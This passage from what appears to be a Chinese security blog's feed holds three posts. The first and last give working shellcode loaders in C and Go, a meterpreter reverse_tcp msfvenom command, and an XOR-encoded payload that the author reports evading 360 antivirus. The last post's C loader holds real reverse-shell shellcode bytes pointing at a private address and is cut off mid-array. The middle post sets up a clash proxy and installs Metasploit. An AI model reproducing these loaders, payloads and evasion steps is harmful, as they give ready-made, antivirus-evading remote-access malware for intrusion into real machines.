   ((<span class="type">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="内联汇编加载"><a href="#内联汇编加载" class="headerlink" title="内联汇编加载"></a>内联汇编加载</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)  </span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        jmp eax</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Go语言加载shellcode"><a href="#Go语言加载shellcode" class="headerlink" title="Go语言加载shellcode"></a>Go语言加载shellcode</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line"><span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">PAGE_EXECUTE_READWRITE = <span class="number">0x40</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">kernel32      = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">ntdll         = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span><br><span class="line">VirtualAlloc  = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">shellcode_buf = []<span class="type">byte</span>&#123;</span><br><span class="line"><span class="number">0xfc</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe4</span>, <span class="number">0xf0</span>, <span class="number">0xe8</span>, <span class="number">0xcc</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x51</span>, <span class="number">0x41</span>, <span class="number">0x50</span>, <span class="number">0x52</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x60</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x18</span>, <span class="number">0x51</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line"><span class="number">0x52</span>, <span class="number">0x20</span>, <span class="number">0x56</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x72</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x0f</span>, <span class="number">0xb7</span>, <span class="number">0x4a</span>, <span class="number">0x4a</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xac</span>, <span class="number">0x3c</span>, <span class="number">0x61</span>, <span class="number">0x7c</span>, </span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">checkErr</span><span class="params">(err <span class="type">error</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line"><span class="built_in">println</span>(err.Error())</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">shellcode := shellcode_buf</span><br><span class="line">addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;内存分配成功&quot;</span>)</span><br><span class="line">_, _, err = RtlCopyMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;内存复制成功&quot;</span>)</span><br><span class="line">syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用go加载shellcode有两个问题需要注意，一是shellcode要生成x64架构的，二是shellcode需要生成num格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=xxxxxxx lport=xxxx -a x64 -f num</span><br></pre></td></tr></table></figure><h2 id="shellcode变形免杀初探"><a href="#shellcode变形免杀初探" class="headerlink" title="shellcode变形免杀初探"></a>shellcode变形免杀初探</h2><p>shellcode的本质是计算机可直接执行的机器码，比汇编语言更低一层的存在，对于msf生成的一段弹出calc.exe的shellcode，翻译成汇编语言如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">00446000 | FC               | cld                                   |</span><br><span class="line">00446001 | E8 82000000      | call shellcodeanalyse.446088          |</span><br><span class="line">00446006 | 60               | pushad                                |</span><br><span class="line">00446007 | 89E5             | mov ebp,esp                           | upper stack</span><br><span class="line">00446009 | 31C0             | xor eax,eax                           | eax:unsigned char * buf</span><br><span class="line">0044600B | 64:8B50 30       | mov edx,dword ptr fs:[eax+30]         | PEB</span><br><span class="line">0044600F | 8B52 0C          | mov edx,dword ptr ds:[edx+C]          | DllList</span><br><span class="line">00446012 | 8B52 14          | mov edx,dword ptr ds:[edx+14]         | InMemoryOrderModuleList</span><br><span class="line">00446015 | 8B72 28          | mov esi,dword ptr ds:[edx+28]         | Full_DLLNAME_Buffer</span><br><span class="line">00446018 | 0FB74A 26        | movzx ecx,word ptr ds:[edx+26]        | MaximumLength</span><br><span class="line">0044601C | 31FF             | xor edi,edi                           | edi:___argv</span><br><span class="line">0044601E | AC               | lodsb                                 |</span><br><span class="line">0044601F | 3C 61            | cmp al,61                             | upper(ch)</span><br><span class="line">00446021 | 7C 02            | jl shellcodeanalyse.446025            |</span><br><span class="line">00446023 | 2C 20            | sub al,20                             |</span><br><span class="line">00446025 | C1CF 0D          | ror edi,D                             | (rotate)res&gt;&gt; 0xD</span><br><span class="line">00446028 | 01C7             | add edi,eax                           | edi:___argv, eax:unsigned char * buf</span><br><span class="line">0044602A | E2 F2            | loop shellcodeanalyse.44601E          |</span><br><span class="line">0044602C | 52               | push edx                              | edi:hash of(dll name)</span><br><span class="line">0044602D | 57               | push edi                              | edi:___argv</span><br><span class="line">0044602E | 8B52 10          | mov edx,dword ptr ds:[edx+10]         | dllbase</span><br><span class="line">00446031 | 8B4A 3C          | mov ecx,dword ptr ds:[edx+3C]         | nt_headers</span><br><span class="line">00446034 | 8B4C11 78        | mov ecx,dword ptr ds:[ecx+edx+78]     | export_entry</span><br><span class="line">00446038 | E3 48            | jecxz shellcodeanalyse.446082         | jump if ecx==0 judge if export</span><br></pre></td></tr></table></figure><p>原文<a href="https://blog.csdn.net/qq_35740100/article/details/116300959">https://blog.csdn.net/qq_35740100/article/details/116300959</a></p><p>结合一段弹出calc的shellcode进行试验</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220214210558174.png" alt="image-20220214210558174"></p><p>有程序的输出可知，shellcode的长度为194字节，\x意味着后面是16进制。所以shellcode就是一段194字节长的16进制数据。由于shellcode是16进制而不是字符串的缘故，用常规的加密思路去处理显得很困难。</p><p>在这里我使用异或的方法处理shellcode，异或的特点是原数据经过两次异或后与原来相同，本例中最终的buf经过函数指针执行是可以正常启动calc.exe的。将第一次异或后密文保存，使用时在代码中解密，就是变形免杀的初步思想。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220214212414026.png" alt="image-20220214212414026"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x88\xa\xa\xa\x6a\x83\xef\x3b\xca\x6e\x81\x5a\x3a\x81\x58\x6\x81\x58\x1e\x81\x78\x22\x5\xbd\x40\x2c\x3b\xf5\xa6\x36\x6b\x76\x8\x26\x2a\xcb\xc5\x7\xb\xcd\xe8\xf8\x58\x5d\x81\x58\x1a\x81\x40\x36\x81\x46\x1b\x72\xe9\x42\xb\xdb\x5b\x81\x53\x2a\xb\xd9\x81\x43\x12\xe9\x30\x43\x81\x3e\x81\xb\xdc\x3b\xf5\xa6\xcb\xc5\x7\xb\xcd\x32\xea\x7f\xfc\x9\x77\xf2\x31\x77\x2e\x7f\xee\x52\x81\x52\x2e\xb\xd9\x6c\x81\x6\x41\x81\x52\x16\xb\xd9\x81\xe\x81\xb\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x55\x55\x50\x81\x18\xe1\x87\x57\x60\xb\x87\x8f\xb8\xa\xa\xa\x5a\x62\x3b\x81\x65\x8d\xf5\xdf\xb1\xfa\xbf\xa8\x5c\x62\xac\x9f\xb7\x97\xf5\xdf\x36\xc\x76\x0\x8a\xf1\xea\x7f\xf\xb1\x4d\x19\x78\x65\x60\xa\x59\xf5\xdf\x69\x6b\x66\x69\x24\x6f\x72\x6f\xa\xa&quot;</span>;</span><br><span class="line"><span class="type">int</span> shellcodesize = <span class="keyword">sizeof</span>(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,shellcodesize);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;shellcodesize; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[i] ^= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">((<span class="type">void</span>(*)(<span class="type">void</span>)) &amp; buf)(); </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将shellcode换成反弹shell再次进行试验，360动态静态全部免杀正常上线。但是当360开启鲲鹏引擎时动静都被查杀。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220214215609208.png" alt="image-20220214215609208"></p><p>windows defender直接查杀</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220214214317184.png" alt="image-20220214214317184"></p><p>从vt查杀率来看，效果还有待提高，不过相比未作处理已有很大改善。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220214220213323.png" alt="image-20220214220213323"></p>]]></content>
      
      
      <categories>
          
          <category> 木马免杀 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>在腾讯云上配置clash代理访问Github</title>
      <link href="/config-clash-on-linux.html"/>
      <url>/config-clash-on-linux.html</url>
      
        <content type="html"><![CDATA[<p>前些日子在腾讯云上买了一个云服务器，准备拿来搭靶场复现漏洞，结果发现访问不了github。实在是把我难受坏了。扔在一边没再搭理，但是有个公网服务器毕竟是更方便，总拖下去也不是办法，今天开始着手解决这个问题。</p><p>我的解决方法是使用跨平台的代理软件clash。它能提供全局socks代理，和方便直观的web管理界面。能够很好的满足我的需求。</p><h3 id="安装clash"><a href="#安装clash" class="headerlink" title="安装clash"></a>安装clash</h3><p>腾讯云对github完全阻断了，所以要在本机上下载好传到服务器上。下载地址<a href="https://github.com/Dreamacro/clash/releases">https://github.com/Dreamacro/clash/releases</a></p><p>赋予执行权限后，执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./clash-linux-amd64 -d .</span><br></pre></td></tr></table></figure><p>会在当前目录生成配置文件和ip数据库文件，如果数据库下载失败，也可以在本机下载后上传</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220122183717447.png" alt="image-20220122183717447"></p><p>使用本地的配置文件替换，配置文件参数设置如下：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">port:</span> <span class="number">7890</span></span><br><span class="line"><span class="attr">socks-port:</span> <span class="number">7891</span></span><br><span class="line"><span class="attr">redir-port:</span> <span class="number">7892</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">Global</span></span><br><span class="line"><span class="comment"># 设置日志输出级别 (默认级别：silent，即不输出任何内容，以避免因日志内容过大而导致程序内存溢出）。</span></span><br><span class="line"><span class="comment"># 5 个级别：silent / info / warning / error / debug。级别越高日志输出量越大，越倾向于调试，若需要请自行开启。</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">info</span></span><br><span class="line"><span class="comment"># Clash 的 RESTful API</span></span><br><span class="line"><span class="attr">external-controller:</span> <span class="string">&#x27;0.0.0.0:9090&#x27;</span></span><br><span class="line"><span class="comment"># RESTful API 的口令</span></span><br><span class="line"><span class="attr">secret:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 您可以将静态网页资源（如 clash-dashboard）放置在一个目录中，clash 将会服务于 `RESTful API/ui`</span></span><br><span class="line"><span class="comment"># 参数应填写配置目录的相对路径或绝对路径。</span></span><br><span class="line"><span class="comment"># external-ui: folder</span></span><br><span class="line"><span class="attr">proxies:</span></span><br><span class="line">  <span class="bullet">-</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">Standard|广台|IEPL|01</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">ss</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">*************</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">3026</span></span><br><span class="line">    <span class="attr">cipher:</span> <span class="string">rc4-md5</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">***************</span></span><br><span class="line">    <span class="attr">udp:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">plugin:</span> <span class="string">obfs</span></span><br><span class="line">    <span class="attr">plugin-opts:</span></span><br><span class="line">      <span class="attr">mode:</span> <span class="string">http</span></span><br><span class="line">      <span class="attr">host:</span> <span class="string">******************</span></span><br></pre></td></tr></table></figure><p>因为默认全局代理，源配置文件的rules标签可以不要，这样配置文件会小很多。</p><p>再次执行<code>./clash-linux-amd64 -d .</code> 代理已经启动成功。安装到此完成。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220122184610814.png" alt="image-20220122184610814"></p><h3 id="配置clash"><a href="#配置clash" class="headerlink" title="配置clash"></a>配置clash</h3><p>clash提供了web接口方便进行管理，首先设置web接口的口令</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220122184923969.png" alt="image-20220122184923969"></p><p>登录腾讯云控制台，开放9090端口访问</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220122185350853.png" alt="image-20220122185350853"></p><p>登录网站 <a href="http://clash.razord.top/#/proxies">http://clash.razord.top/#/proxies</a> host为服务器公网ip，密钥是上一步设置的口令</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220122185550816.png" alt="image-20220122185550816"></p><p>即可进行快捷切换代理，查看日志，修改端口等操作</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220122185733829.png" alt="image-20220122185733829"></p><p>测试一下，代理已经可以使用了。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220122190133737.png" alt="image-20220122190133737"></p><p>测试成功后可以降低clash日志记录的级别，防止输出过多程序崩溃。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./clash-linux-amd64 -d . &amp;</span><br></pre></td></tr></table></figure><p>将clash放到后台运行</p><blockquote><p>不要忘记定期更新config文件</p></blockquote><h3 id="在Linux终端使用代理"><a href="#在Linux终端使用代理" class="headerlink" title="在Linux终端使用代理"></a>在Linux终端使用代理</h3><ul><li>使用proxychains</li></ul><p>proxychains使用起来非常方便，可以实现在特定环境下使用代理。</p><p>安装完成后，配置/etc/proxychains4.conf 文件，在最后[ProxyList]项目下添加clash的socks5代理监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line"># add proxy here ...</span><br><span class="line"># meanwile</span><br><span class="line"># defaults set to &quot;tor&quot;</span><br><span class="line">socks5 127.0.0.1 7891</span><br></pre></td></tr></table></figure><p>使用代理安装msf框架</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall</span><br><span class="line">chmod 755 msfinstall</span><br><span class="line">proxychains ./msfinstall</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220122195614492.png" alt="image-20220122195614492"></p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220122200141551.png" alt="image-20220122200141551"></p><p>结束</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>使用MSF生成ShellCode</title>
      <link href="/Msfvenom-Gen-ShellCode.html"/>
      <url>/Msfvenom-Gen-ShellCode.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>MsfVenom - a Metasploit standalone payload generator.<br>Also a replacement for msfpayload and msfencode.</p></blockquote><p>MsfVenom 集成了msfpayload 和msfencode的功能，用于生成各种类型的payload</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220113193920408.png" alt="image-20220113193920408"></p><ul><li>首先查看可用的payload类型，我需要Windows平台下的shellcode进行实验，所以使用命令</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --list payload |grep windows</span><br></pre></td></tr></table></figure><p>挑选一个反弹shell的payload<code>windows/shell/reverse_tcp</code></p><ul><li>查看支持的平台架构</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell/reverse_tcp --list archs</span><br></pre></td></tr></table></figure><p>选择x64平台</p><blockquote><p>实际测试中，要根据payload选择对应的平台，否则会提示Error: The selected arch is incompatible with the payload。</p><p>除此之外，我生成x64架构的shellcode并不能直接用c语言加载，可能是我的gcc编译器是32位的。选择x86架构正常加载。</p></blockquote><ul><li>查看可用的payload格式</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell/reverse_tcp -a x64 --list formats</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220113195329226.png" alt="image-20220113195329226"></p><p>选择c语言格式的payload</p><ul><li>使用–list-options查看payload需要配置的参数</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell/reverse_tcp --list-options</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220113195749744.png" alt="image-20220113195749744"></p><ul><li>生成payload</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell/reverse_tcp LHOST=192.168.31.1 LPORT=2333 -a x86 -f c</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220113213041089.png" alt="image-20220113213041089"></p><hr><p>接下来开始测试生成的shellcode是否可用</p><p>首先使用msf设置好监听</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220113213315149.png" alt="image-20220113213315149"></p><p>将生成的shellcode放入c语言加载器中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x0c\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x1f\x12\x68\x02&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x09\x1d\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line"><span 